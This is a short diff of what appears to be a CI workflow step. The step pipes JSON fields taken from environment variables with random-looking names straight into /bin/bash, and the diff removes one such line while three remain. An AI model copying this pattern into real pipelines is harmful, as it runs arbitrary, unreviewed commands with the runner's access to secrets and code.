@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$ih47" | jq -r .xqh4828 | /bin/bash
           echo $sq56 | jq -r .gczla6 | /bin/bash
-          printf '%s' "$gwu0" | jq -r .ki5816 | /bin/bash
           echo $eul29 | jq -r .skyzg39 | /bin/bash
 
       - name: Upload output
